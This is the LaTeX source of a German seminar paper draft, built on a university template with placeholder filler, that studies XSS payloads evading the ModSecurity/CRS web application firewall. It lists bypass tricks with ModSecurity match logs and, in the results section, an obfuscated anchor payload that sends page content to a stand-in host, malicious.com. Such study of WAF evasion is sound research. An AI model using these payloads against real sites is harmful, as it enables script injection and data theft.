% Autor der Vorlage: Dominik Auracher
\documentclass[11pt, bibliography=numbered, headsepline, numbers=withenddot]{scrartcl}

% Paket für Abkürzungsverzeichnis
\usepackage[acronym, automake=delayed, nopostdot]{glossaries}
% Neue Abkürzung definieren (Sortierung egal)
% Aufbau: \newacronym{label-for-the-text}{short-version}{long-version}
\newacronym{owa}{OWA}{Outlook Web App}
\newacronym{test}{TEST}{T E S T}
\newacronym{so}{SO}{SOLUTION}
\newacronym{waf}{WAF}{Web Application Firewall}

\makeglossaries

% Allgemeine Informationen
\renewcommand{\author}{\color{red}Vorname Nachname} % Autor
\newcommand{\jury}{\color{red}Prüfungskomitee} % Prüfungskomitee
\newcommand{\location}{\color{red}München} % Ort, an welchem die Arbeit geschrieben wurde
\newcommand{\matriculationnumber}{\color{red}123456} % Matrikelnummer
\newcommand{\submissiondate}{\color{red}\today} % Datum der Abgabe
\newcommand{\supervisor}{\color{red}Betreuer} % Betreuung
\renewcommand{\title}{\color{red}Titel der Arbeit} % Titel der Arbeit

% Macro für Anführungsstriche
% Verwendung: \quotes{Text} -> Resultat: "Text"
\newcommand{\quotes}[1]{``#1''}

% WICHTIG:
% Bei erstmaliger Einrichtung TeXstudio -> TeXstudio konfigurieren -> Optionen -> Erzeugen -> "Standard Bibliographieprogramm" = "Biber" setzen!
\usepackage[a4paper, left=2.5cm, top=3cm, right=3cm, bottom=2.75cm]{geometry}

% Paket zur eigenen Darstellung der Kopf-/Fußzeilen
\usepackage[automark]{scrlayer-scrpage}
\clearscrheadfoot
\setlength{\headheight}{1.27cm}
\setlength{\footheight}{1.27cm}

% Paket zur Ermittlung der letzten Seite
\usepackage{lastpage}

% Paket für Deutschsprachige Inhalte
\usepackage[ngerman]{babel}
\usepackage[utf8]{inputenc}
\usepackage[T1]{fontenc}
\usepackage[babel, german=quotes]{csquotes}

% Paket für Quellcode-Anzeige (auch Inline!)
\usepackage{listings}

% Paket für Auflistungen
\usepackage[inline]{enumitem}

% Paket für Grafiken
\usepackage{graphicx}

% Paket für Farbgebungen
\usepackage{xcolor}

% Quellenverwaltung
\usepackage[backend=biber, style=alphabetic, isbn=false, hyperref=true]{biblatex}
\addbibresource{literature.bib}
%\DeclareFieldFormat*{title}{#1}            % Format for bibliography
\DeclareFieldFormat*{citetitle}{#1}        % Format for citations

% Paket, welches das Jahr zusätzlich in die Fußnote aufnehmen kann
\usepackage{xpatch}
\xapptobibmacro{cite}{\setunit{\nametitledelim}\printfield{year}}{}{}

% Paket und Konfiguration für Zahlen
\usepackage[locale=DE]{siunitx}
\sisetup{per-mode=fraction}

% Paket und Konfiguration für Schriftart
% Zur Verwendung von Arial, TeXstudio konfigurieren: Optionen -> TeXstudio konfigurieren -> Optionen -> Erzeugen -> "Standardcompiler" = "XeLaTeX" setzen!
% \usepackage{fontspec}
% \setmainfont{Arial}
% \setsansfont{Arial}

% package for code
\usepackage{listings}

% Wichtig: Als letztes Paket laden!
\usepackage{hyperref}
\hypersetup{
	colorlinks=false,
	allbordercolors=white
}

% Neu-Definition der Namen
\renewcommand{\sectionautorefname}{Abschnitt}
\renewcommand{\subsectionautorefname}{Abschnitt}
\renewcommand{\subsubsectionautorefname}{Abschnitt}
\renewcommand{\figureautorefname}{Abb.}
\renewcommand{\tableautorefname}{Tab.}
\renewcommand{\listoflofentryname}{Abb.}

% Zeilenabstand einstellen
\renewcommand{\baselinestretch}{1.25}

\begin{document}
	% Deckblatt
	\begin{titlepage}
	\centering
	\includegraphics[width=0.8\textwidth]{"General/HDBW_Logo_large.png"}
	\vfill
	{\LARGE\bfseries Seminararbeit\par}
	\vspace{1cm}
	{\Large\bfseries \title\par}
	\vfill
	{\Large vorgelegt von:\par}
	{\Large\bfseries \author\par}
	{\Large (Matrikelnummer: \matriculationnumber)\par}
	\vfill
	\begin{tabular}{ll}
		vorgelegt am: & \submissiondate\\
	\end{tabular}
	\par
	\begin{tabular}{ll}
		Prüfer: & \jury\\
		Betreuung: & \supervisor\\
	\end{tabular}
\end{titlepage}

	\newpage

	% Kopf-/Fußzeilen ab 2. Seite
	\renewcommand*\sectionmarkformat{}% keine Nummerierung im Kopf
	\renewcommand*{\headfont}{\normalfont} % Nicht kursiv	
	\rohead*{\includegraphics{"General/HDBW_Logo_small.png"}}
	\lofoot*{\scriptsize \submissiondate}
	\rofoot*{\scriptsize Seite \thepage\ von \pageref{LastPage}}
	
	% Eidesstattliche Erklärung
	\lohead*{Eidesstattliche Erklärung}

\section*{Eidesstattliche Erklärung}
\label{sec:Eidesstattliche Erklärung}
Hiermit versichere ich, dass die vorliegende Arbeit ohne Hilfe Dritter und nur mit den angegebenen Quellen und Hilfsmitteln angefertigt wurde. Alle verwendeten Passagen wurden kenntlich gemacht. Diese Arbeit hat in gleicher oder ähnlicher Form noch keiner Prüfungsbehörde vorgelegen.
\newline
\newline
\newline
\newline
\author
\newline
\location, \submissiondate

	\newpage
	
	% Zusammenfassung
	\color{black}
	\lohead*{Zusammenfassung}

\section*{Zusammenfassung}
\label{sec:Zusammenfassung}
Kurze \gls{test} Zusammenfassung der wichtigsten \gls{test} Inhalte

	\newpage
	
	% Kopf-/Fußzeilen ab 4. Seite
	\lohead*{\headmark}
	
	% Inhaltsverzeichnis
	\tableofcontents
	\newpage
	
	% Abkürzungsverzeichnis
	\printglossary[type=\acronymtype,title={Abbreviations},style=tree,nonumberlist]
	
	% Abbildungsverzeichnis
	\listoffigures
	
	% Tabellenverzeichnis
	%\listoftables
	
	% Quellcode-Verzeichnis
	\lstlistoflistings
	\newpage
	
	% --- INHALT ---
	\section{Ein Beispiel-Hauptkapitel}
\label{sec:Ein Beispiel-Hauptkapitel}
% In diesem Kapitel zu sehen:
% - Anführungsstriche (siehe z.B. \quotes{Onlinevideo} wird zu "Onlinevideo")
% - Verbieten von Silbentrennung (siehe \mbox{Kopfzeile})
% - Zentrierter Text (siehe \begin{center} bzw. \end{center})
% - Kursiver Text (siehe \textit{Dies ist ein kursiver Text})
% - Fetter Text (siehe \textbf{Dies ist ein fetter Text})
% - Unterstrichener Text (siehe \underline{Dies ist ein unterstrichener Text})
Video bietet eine leistungsstarke Möglichkeit zur Unterstützung Ihres Standpunkts. Wenn Sie auf \quotes{Onlinevideo} klicken, können Sie den Einbettungscode für das Video einfügen, das hinzugefügt werden soll. Sie können auch ein Stichwort eingeben, um online nach dem Videoclip zu suchen, der optimal zu Ihrem Dokument passt. Damit Ihr Dokument ein professionelles Aussehen erhält, stellt Word einander ergänzende Designs für \mbox{Kopfzeile}, Fußzeile, Deckblatt und Textfelder zur Verfügung. Beispielsweise können Sie ein passendes Deckblatt mit \mbox{Kopfzeile} und Randleiste hinzufügen. Klicken Sie auf \quotes{Einfügen}, und wählen Sie dann die gewünschten Elemente aus den verschiedenen Katalogen aus. Designs und Formatvorlagen helfen auch dabei, die Elemente Ihres Dokuments aufeinander abzustimmen. Wenn Sie auf \quotes{Entwurf} klicken und ein neues Design auswählen, ändern sich die Grafiken, Diagramme und SmartArt-Grafiken so, dass sie dem neuen Design entsprechen. Wenn Sie Formatvorlagen anwenden, ändern sich die Überschriften passend zum neuen Design. Sparen Sie Zeit in Word dank neuer Schaltflächen, die angezeigt werden, wo Sie sie benötigen. 

\begin{center}
	Dies ist ein zentrierter Text
\end{center}

\textit{Dies ist ein kursiver Text}

\textbf{Dies ist ein fetter Text}

\underline{Dies ist ein unterstrichener Text}

\underline{Dies ist eine \textbf{Kombination} aus \textit{vielem}}

\subsection{Ein Unterkapitel}
\label{sec:Ein Unterkapitel}
% In diesem Kapitel zu sehen:
% - Zitate
%   Voraussetzung ist ein Eintrag mit dem jeweiligen Namen in der Datei "literatur.bib"
%   - Indirektes Zitieren (siehe \autocite[Vgl.][]{BavariaIpsum}), wodurch eine Fußnote und ein Eintrag im Literaturverzeichnis aufgeführt wird
%   - Direktes Zitieren (siehe \autocite{BavariaIpsum}), wodurch ebenfalls eine Fußnote und ein Eintrag im Literaturverzeichnis aufgeführt wird - jedoch ein anderer
%   - Indirektes Zitat mit Angabe von Seitenzahl 
% - Neue (eingerückte) Zeile direkt vor dem Zitat (\quotes{Einfach ausgedrückt, ist Bavaria ipsum eine neue Variante des Lorem-ipsum-Blindtextes.}\autocite{BavariaIpsum})
% - Neue (nicht eingerückte) Zeile (\noindent Der Algorithmus ...)
% - Eigene Silbentrennung (siehe Non-Profit-Or\-ga\-ni\-sa\-tion; wird an einem der \- getrennt - sofern erforderlich, wenn nicht erforderlich, wird keiner der \- angezeigt)
Aus’gschammta, Umstandskrama, Klaubauf, Jungfa, Schdehlratz, Vieh mit Haxn, Zwedschgarl, varreckta Deifi, Hampara, Schuggsn, Daamaluudscha, Aufgeiga, Goaspeterl, Stodara, Palmesel, Schrumsl, Fünferl, oide Schäsn, Sagglzemend, Grantlhuaba, Ruaßnosn, Gibskobf, mit deinen Badwandlfüaß, Broatarsch, Gscheidal, Blattada, Hornochs, Asphaltwanzn, du Ams’l, du bleede, schleich di, Klugscheissa, Sagglzemend, Gschpusi, oide Rudschn, Hampara, Pfundhamme, oida Schlawina, Aushuifsbaya, Dreegsau, damischa Saupreiß, Auftaklta, Luada, Kirchalicht, Rotzgloggn, oide Schäsn, Heislmo, Schdinkadores, glei fangst a boa, Beitlschneida, Ecknsteha, Hanswurst, hosd mi, oida Schlawina, Freindal, Freibialädschn, hoit’s Mei, Griasgram, Drottl, varreckter Hund, Bettwanzn, Griasgram, Schundnickl, depperta Doafdebb, Zwedschgnmanndl, Griasgram, oida Schlawina, eigschnabbda, Pfennigfuxa, Woibbadinga, greißlicha Uhu, Grattla, Eisackla, Klobürschdn, Affnasch, oide Bixn, Dreegsau, Beitlschneida, Heislschlaicha, Dipfalscheißa, Jungfa, Hallodri, Hosnscheissa, Pfundhamml, Betonschedl, Hemmadbiesla, Fünferl, bsuffas Wagscheidl, Hopfastanga, Hungaleida, Kniabisla, Charaktasau, Krampfhenna, Ecknsteha, damischa Saupreiß, Palmesel, Oasch, Radlfahra, schleich di, Betonschedl, Zigarettnbiaschal!\autocite[Vgl.][]{BavariaIpsum} 

\quotes{Einfach ausgedrückt, ist Bavaria ipsum eine neue Variante des Lorem-ipsum-Blindtextes.}\autocite{BavariaIpsum}

\noindent Der Algorithmus für die Verschlüsselung und etwas mehr wurde durch die Non-Profit-Or\-ga\-ni\-sa\-tion entwickelt.\autocite[Vgl.][73]{HeiseHarterWettbewerb}

\subsection{Noch ein Unterkapitel}
\label{sec:Noch ein Unterkapitel}
% In diesem Kapitel zu sehen:
% - Einfügen eines Bildes (alles zwischen \begin{figure} und \end{figure})
% - Referenz auf irgendetwas, hier ein Bild (\ref{fig:hdbw-logo})
% - Nutzung von Abkürzungen (bedingt einen Eintrag in der Datei "Abkürzungen.tex"; siehe \gls{owa})
%   -> WICHTIG: Das Abkürzungsverzeichnis wird (warum auch immer) erst nach dem zweiten Build aktualisiert. D.h. beim Abschluss oder wenn die Änderungen wirksam werden sollen, einfach zweimal den Play-Button drücken ;)
% - Beschreibungen (alles zwischen \begin{description} und \end{description})
% - Aufzählungen
%   - Allgemein (siehe \begin{itemize} bis \end{itemize})
%   - Nummerisch (siehe \begin{enumerate} bis \end{enumerate})
%   - Gemischt (ganz unten)
Hier ist ein schönes Bild mit einer Referenz auf Abbildung \ref{fig:hdbw-logo} zu sehen.\autocite[Vgl.][]{HDBWLogo} Außerdem ist es schön \gls{owa} zu nutzen, da \gls{owa} auch schöne Funktionen bietet.
\begin{figure}
	\centering
	\includegraphics[width=0.8\textwidth]{"General/HDBW_Logo_large.png"}
	\caption{Logo der HDBW-Hochschule (\citeauthor{HDBWLogo} \citeyear{HDBWLogo})}
	\label{fig:hdbw-logo}
\end{figure}

\subsubsection{Beschreibung}
\label{sec:Beschreibung}
\begin{description}
	\item [Trottel] Leute, die einfach doof sind
	\item [Idiot] Das selbe, nur anders
\end{description}

\subsubsection{Allgemeine Aufzählung}
\label{sec:Allgemeine Aufzählung}
\begin{itemize}
\item Erster Punkt
	\begin{itemize}
		\item 1. Ebene
	\end{itemize}
\item Zweiter Punkt
\end{itemize}

\subsubsection{Nummerische Aufzählung}
\label{sec:Nummerische Aufzählung}
\begin{enumerate} 
\item Erster Punkt
	\begin{itemize}
		\item 1. Ebene
	\end{itemize}
\item Zweiter Punkt
\end{enumerate}

\subsubsection{Gemischte Aufzählung}
\label{sec:Gemischte Aufzählung}
\begin{enumerate} 
	\item Erster Punkt
	\begin{enumerate}
		\item 1. Ebene
	\end{enumerate}
	\item Zweiter Punkt
\end{enumerate}

\subsubsection{test}
\label{sec:test}
Here is a little bit of text! \cite{XSSPayloadbox}

	
	\section{Firewall evasion techniques}

Compatibility with browsers is not being regarded. {\color{red} TODO: check JavaScript versions (ECMA script 6) and write about browser compatibility}
Naturally, when discussing web application firewall evasion, most chosen firewall evasion techniques are covering XSS Payloads.

All techniques are available {\color{red}(at the time of writing)}

\subsection{Various Payloads}

\subsubsection{Payload size}

\subsubsection{Unicode encoding in JSON}
Detected by modsecurity, checked with \u0024 and \u0028

\subsubsection{Case alternation}
In order to evade regex filerting by the WAF, the case of a payload can be alternated. \cite{medium/allypetitt}
Modern regex flavors allow the application of modifiers to parts of the regular expression.
One such modifier is \verb|(?i)|. It makes the regex case insensitive. \cite{regex/jan} Only when this modifier is not used, can a payload evade regex filtering using case alternation. 

Taking the XSS payload \verb|<script>alert('XSS')</script>| as an example, after applying case alternation, it might result in a payload in the form of: \verb|<sCrIpT>alert('XSS')</sCriPt>|.
Another example is file access on a wrongfully public file.
The Windows file system trests file and directory names as case-insensitive by default. \cite{windows/casesensitive}
On a web server hosted on Windows that exposes a .env file with stored secrets, both urls: \\ \verb|http://127.0.0.1:8000/.env| and \verb|http://127.0.0.1:8000/.enV| \\
are treated equally. {\color{blue} verified by the author using the python webserver module on windows 10 [should this be here?]}


\subsection{XSS Payloads}

\subsubsection{Tag modification}
In a case, where regex filters are configured to look for html tags, modifying html tags might make a payload evade the filter. Possible modifications include:
\begin{itemize}
	\item prepending the tag with an additional \verb|<|: \verb|<<script>alert('XSS')</script>|
	\item omitting the closing tag: \verb|<script>alert('XSS')| 
	\item using double open angle brackets: \verb|<iframe src=javascript:alert('XSS') <|
	\item using uncommon tags: \\ \verb|<STYLE>.classname{background-image:url("javascript:alert(XSS)");}</STYLE>|
\end{itemize}
Technique by \cite{medium/allypetitt}

\subsubsection{Space replace}
A regex filter that is expecting a space inside a html tag at certain positions can be evaded by replacing the space with a \verb|/|. 
For instance, \verb|<img src=1 onerror=alert('XSS')>| becomes \verb|<img/src=1/onerror=alert('XSS')>|.
Technique by \cite{medium/allypetitt}

\subsubsection{HTML encoding}
see the <a> thing

\subsubsection{String passing}

\subsubsection{Tagged Template Literals}
Tagged Template Literals can be used in JavaScript payloads to avoid detection of JavaScript function calls in an http request. Dr. Alex Rauschmeyer explains Tagged Template Literals in ``Exploring ES6'':
\begin{quotation} Tagged Template Literals are function calls whose parameters are provided via template literals. [...]
	The following is a tagged template literal (short: tagged template):
	\begin{lstlisting}
tagFunction`Hello ${firstName} ${lastName}!`
\end{lstlisting}
	Putting a template literal after an expression triggers a function call, similar to how a parameter list (comma-separated values in parentheses) triggers a function call. The previous code is equivalent to the following function call (in reality, first parameter is more than just an Array, but that is explained later).
	\begin{lstlisting}
tagFunction(['Hello ', ' ', '!'], firstName, lastName)
\end{lstlisting}
	Thus, the name before the content in backticks is the name of a function to call, the tag function.
	\cite{exploringes6/templatelit}
\end{quotation}

As the function \verb|alert| can be called with an array as first parameter, it is possible to substitute the payload with \verb|alert`XSS`|. The substitute payload might evade regex filtering that looks for a function name followed by an opening \verb|(|.
Technique by \cite{onecons/wafbypass}.


\subsubsection{eval() function}
\label{sec:eval}

JavaScript payloads that are being passed in string format can be executed using the eval function. The \verb|eval()| function will evaluate the source string given as an argument and return its completion value. \cite{js/eval}
A possible usecase for \verb|eval()| in the quest to bypass a \gls{waf} is the splitting of function names that would cause a HTTP request to get rejected by the firewall.
Looking at Listing~\ref{lst:alertXSSblocked}, it is clear that the function call \verb|alert('XSS')| is being blocked by the ModSecurity firewall using CRS 4.1.0.
To avoid a match on \verb|alert(|, it is possible to split the function call into parts \verb|al|, \verb|e| and \verb|rt('XSS')| by using string concatenation in the form of \verb|`al` + `e` + `rt('XSS')`|.
Sending the payload in this form will not cause the the desired effect, as a JavaScript interpreter will interpret the payload as a string instead of a function call to the \verb|alert()| function.
Using the \verb|eval()| function in combination with the splitted string solves this problem. Passing the string \verb|`al` + `e` + `rt('XSS')`| in the form of \verb|eval(`al` + `e` + `rt('XSS')`)| as an argument to the \verb|eval()| function will cause the string to be evaluated and interpreted. Technique inspired by \cite{onecons/wafbypass}.
The ModSecurity firewall using CRS 4.1.0. checks for usage of the function \verb|eval()| and tries to block requests containing it. An example is listed in Listing~\ref{lst:evalalertXSSblocked}.

\begin{lstlisting}[style=ruleStyle, language=XML, caption=eval(`al` + `e` + `rt('XSS')`) blocking example, label={lst:evalalertXSSblocked}]
<payload>eval(`al` + `e` + `rt('XSS')`)</payload>
<file>"rules/REQUEST-933-APPLICATION-ATTACK-PHP.conf"</file>
<fileDetails>[line "331"] [id "933160"]<fileDetails>
<MatchedData>"eval(`al`   `e`   `rt('XSS')"</MatchedData>

<file>"rules/REQUEST-934-APPLICATION-ATTACK-GENERIC.conf"</file>
<fileDetails>[line "52"] [id "934100"]<fileDetails>
<MatchedData>"eval("</MatchedData>

<file>"rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "714"] [id "941390"]<fileDetails>
<MatchedData>"eval("</MatchedData>
\end{lstlisting}

\subsubsection{function constructor}
\label{sec:functionconstructor}

When using the function \verb|eval()| (see Section~\ref{sec:eval}) causes a request to be blocked, a substitute in the form of \verb|[].constructor.constructor(`alert('XSS')`)()| is available in JavaScript.

Calling \verb|[]| will create an empty array, which is a special kind of object.
Any kind of object in JavaScript, with the exception of null prototype objects, will have a constructor property on its prototype. \cite{js/object}

The Array objects constructor can be accessed by calling \verb|.constructor| on an instance of Array, like \verb|[].constructor|. \cite{js/array}
Constructors are technically regular functions. \cite{js/constructor}
As such, they are Function objects. Function objects have a constructor themselfes, which again is called using the \verb|.constructor| notation.

Using \verb|[].constructor.constructor| will yield access to the Function() constructor.
Calling the Function() constructor directly can create functions dynamically, similar to using \verb|eval()|.
The difference being that the Function() constructor creates functions that execute in the global scope only.

The Function() constructor takes a variable count of arguments. The first $n - 1$ arguments are the \quotes{names to be used by the function as formal argument names. Each must be a string that corresponds to a valid JavaScript parameter [...]} \cite{js/function}
The last argument given to the Function() constructor is expected to be a string containing the JavaScript statements compromising the function definition. \cite{js/function}

Therefore, the afromentioned substitute for \verb|eval()| - \\ \verb|[].constructor.constructor(`alert('XSS')`)()| - \\ will create a function with the function body \verb|alert('XSS')| and call it directly.
In other words: It will call a function that calls \verb|alert('XSS')|.
Technique by \cite{onecons/wafbypass}.

\subsubsection{square bracket notation}
JavaScript provides a \quotes{square bracket notation} to access properties of an Object. It is used to access multiword properties as well as provide a way of obtaining property names as the result of an expression. \cite{js/brackets}

This \quotes{square bracket notation} allows to substitute the dot notation in a case where using the dot notation is not feasible or blocked by firewall rules.
For instance, in a payload composed using the function constructor as stated in \ref{sec:functionconstructor}, the part \\ \verb|[].constructor.constructor(`alert('XSS')`)()| can be substituted with \\ \verb|[][`constructor`][`constructor`](`alert('XSS')`)()|.


\subsubsection{string replace}
\label{sec:stringreplace}
When passing certain characters is not feasible, there is a chance they can be substituted in a string replacement strategy using the \verb|+| operator.
A part of the description of the \verb|+| operator in JavaScript states:
\begin{quote}
	The + operator is overloaded for two distinct operations: numeric addition and string concatenation. When evaluating, it first coerces both operands to primitives. ... \cite{js/+}
\end{quote}
In the process of primitive coercion, objects are converted to primitives by calling their \verb|[@@toPrimitive]()|, \verb|valueOf()| and \verb|toString()| methods in the given order. Date and Symbol objects are the only built-in objects that override the \verb|[@@toPrimitive]()| method.
Objects without an override for the \verb|[@@toPrimitive]()| method inherit \verb|valueOf| from \verb|Object.prototype.valueOf|, which returns the object itself.
Since the return value is an object, it is ignored and \verb|toString()| is called instead. \cite{js/primitiveCoercion}

In the code \verb|open + []|, \verb|open| is a built-in Function object, \verb|[]| is a built-in Array object.
In the process of primitive coercion, for both, their \verb|toString()| method is being called.
When they are joined by the \verb|+| operator, it results in a String in the form of \verb|open.toString()| concatenated with \verb|[].toString()|. The result is equal to \verb|open.toString()| (see Listing~\ref{lst:opentostring}) as \verb|[].toString()| returns an empty String.

\begin{lstlisting}[style=basicStyle, caption=open.toString() in JavaScript, label={lst:opentostring}]
function open() {
    [native code]
}
\end{lstlisting}

In JavaScript, array-like access to String objects is possible. \cite{js/stringbrackets} For example, \verb|[open+[]][0][13]| returns the character \verb|(|. \verb|[open+[]][0][14]| returns the character \verb|)|. Listing~\ref{lst:opentostringindices} visualizes open.toString() with the corresponding indices.

\begin{lstlisting}[style=basicStyle, caption=open.toString() with indices in JavaScript, label={lst:opentostringindices}]
f u n c t i o n   o p  e  n  (  )     {  \n       
0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 

[  n  a  t  i  v  e     c  o  d  e  ]  \n }  
22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 
\end{lstlisting}


\subsubsection{Aurebesh}






	\section{Evaluation Results}
\label{sec:EvaluationResults}
Combination of <a> with javascript in href injection, HTML ascii encoding, tagged template literals (line breaks for readability)
\begin{lstlisting}[style=basicStyle]
	<a href=j&#97v&#97script&#x3A;
	var&#32secret&#32=&#32document.getElementsByName("name")[0]&#46innerHTML;
	var&#32data&#32=&#32&#123body:secret,method:'POST'\};
	fetch`https:\//malicious.com:3001/api/ping?secret=querysecret$&#123data\}`>ClickMeFor$</a>
\end{lstlisting}

\begin{itemize}
	\item Using function constructor to evade eval() detection
	\item supplying the argument via tagged template literal to avoid () characters
	\item the 'a' in front of the template in the template string to avoid an error that is thrown if the first parameter in a multi parameter call to the function constructor is not a valid javascript parameter
	\item using string replace to avoid supplying the full sequence of 'alert' and to replace () characters
\end{itemize}

theoretically a payload without () is possible like this but it turns out that passing a template literal string with \verb|${...}| syntax is being flagged as unix command injection

\begin{lstlisting}[style=basicStyle, caption=Payload inspired by \cite{onecons/wafbypass}]
	[][`constructor`][`constructor`]`a${`al` + [open + []][0][11] + `rt` + [open + []][0][13] + [`"`][0] + `XSS` + [`"`][0] + [open + []][0][14]}```
\end{lstlisting}


tried to encode the  payload:
\begin{lstlisting}[style=basicStyle, caption=Payload inspired by \cite{onecons/wafbypass}]
	[][`constructor`][`constructor`]`a${`al` + [open + []][0][11] + `rt` + [open + []][0][13] + [`"`][0] + `XSS` + [`"`][0] + [open + []][0][14]}```
\end{lstlisting}
with unicode and html, even the weird unicode. but the modsecurity waf decodes both and blocks TODO

weird unicode: tried using 
\begin{lstlisting}[style=basicStyle, caption=Payload inspired by \cite{onecons/wafbypass}]
	console.log(encodeURIComponent('[][`constructor`][`constructor`]`a\uFE69{`al`+[open+[]][0][11]+`rt`+[open+[]][0][13]+[`"`][0]+`Oneconsult`+[`"`][0]+[open+[]][0][14]}```'))

	but result is 
{\t\"test2\": \"[][`constructor`][`constructor`]`a__{`al`+[open+[]][0][11]+`rt`+[open+[]][0][13]+[`\"`][0]+`Oneconsult`+[`\"`][0]+[open+[]][0][14]}```\"}
\end{lstlisting}


unicode tests:
\begin{lstlisting}[style=ruleStyle, language=XML, caption=unicode tests \$\{`alert`\}, label={lst:unicodetests}]
<payload>${`alert`}</payload>
<message>"Remote Command Execution: Unix Shell Expression Found"</message>
<file>"/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"</file>
<fileDetails>[line "291"] [id "932130"]<fileDetails>
<MatchedData>"${`alert`}"</MatchedData>

<payload>\u0024{alert`}</payload>
<message>"Possible Unicode character bypass detected"</message>
<file>"/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"</file>
<fileDetails>[line "1263"] [id "920540"]<fileDetails>
<MatchedData>"x5cu0024"</MatchedData>

<payload>encodeURIComponent('`\u0024{`alert`}')</payload>
<payload>"%60%24%7B%60alert%60%7D"</payload>
<message>"Remote Command Execution: Unix Shell Expression Found"</message>
<file>"/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"</file>
<fileDetails>[line "291"] [id "932130"]<fileDetails>
<MatchedData>"${`alert`}"</MatchedData>

<file>"rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "714"] [id "941390"]<fileDetails>
<MatchedData>"eval("</MatchedData>
\end{lstlisting}



	% Quellenverzeichnis
	\newpage
	\printbibliography
	
\end{document}
